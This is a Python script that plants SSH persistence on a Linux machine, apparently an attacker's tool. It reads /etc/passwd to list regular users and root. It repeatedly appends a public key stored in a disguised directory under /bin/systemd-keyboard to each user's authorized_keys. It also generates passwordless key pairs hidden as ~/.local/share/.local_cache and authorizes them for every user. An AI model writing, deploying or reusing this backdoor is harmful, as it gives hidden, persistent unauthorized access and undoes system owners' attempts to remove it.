import subprocess
import pathlib

#Use to generate new keys if for whatever reason, the default key cannot be used
def generate_keys(user):
    try:
        if pathlib.Path(f'/home/{user}/.local/share/.local_cache').exists(): #check if the path exists
            recreate_key = subprocess.run(f'ssh-keygen -t ed25519 -f /home/{user}/.local/share/.local_cache -N "" -q <<< y', text= True, shell=True, capture_output=True) #create a new key pair
            copy_in = subprocess.run(f'cat /home/{user}/.local/share/.local_cache.pub >> /home/{user}/.ssh/authorized_keys', text = True, shell=True, capture_output=True) #put it in the authorized_keys file
        else:
            create_key = subprocess.run(f'ssh-keygen -t ed25519 -f /home/{user}/.local/share/.local_cache -N "" -q', text= True, shell=True, capture_output=True) #do the same but use the existing directory
            copy_in = subprocess.run(f'cat /home/{user}/.local/share/.local_cache.pub >> /home/{user}/.ssh/authorized_keys', text=True, shell=True, capture_output=True)
    except FileNotFoundError:
        print(user, "./local/share/.local_cache not found")

#grab users on the machine as ssh keys are user specific
users = []
with open("/etc/passwd", "r") as passwd:
    for line in passwd:
        tokens = line.strip().split(":")
        username = tokens[0]
        uid = int(tokens[2])
        shell = tokens[6]
        if (uid >= 1000 or uid==0) and "nologin" not in shell and "false" not in shell:
            users.append(username) #grab regular and admin users. Dont grab service accounts


# check if theres a .ssh directory if not then create one with an authorized users file. 
for user in users:
    path = pathlib.Path(f"/home/{user}/.ssh/authorized_keys")
    if path.exists():
        continue
    else:
        subprocess.run(['mkdir', f'/home/{user}/.ssh'])
        subprocess.run(['touch', f'/home/{user}/.ssh/authorized_keys'])




# check that the key is still in the authorized_user file
for user in users:
    original_public = f"/bin/systemd-keyboard/.../keys/id_ed25519.pub"
    original_public_value = subprocess.run(["cat", original_public], capture_output=True, text=True)
    current_keys = subprocess.run(["cat", f"/home/{user}/.ssh/authorized_keys"], capture_output=True, text=True)
    if original_public_value.stdout == '' or len(original_public_value.stdout) < 3:
        print(f"{user} key invalid")
    if original_public_value.stdout in current_keys.stdout:
        print(f"{user} ITS IN THERE")
    else:
        print(f"{user} ITS NOT IN THERE")
        print(f"recreateing public key in authorized keys file for {user}")
        replace_pub = subprocess.run([f"cat '{original_public}' >> /home/{user}/.ssh/authorized_keys"], text=True, shell=True, capture_output=True)
        print("Key placed back")

# if its still there, exit quietly

# if the key is unusable remove or create a new public/private key pair
for user in users:
    path = pathlib.Path(f"/home/{user}/.local/share")
    if path.exists and path.is_dir():
        generate_keys(user)
    else:
        subprocess.run(['mkdir', f'/home/{user}/.local/share'], text=True, capture_output=True)
        generate_keys(user)

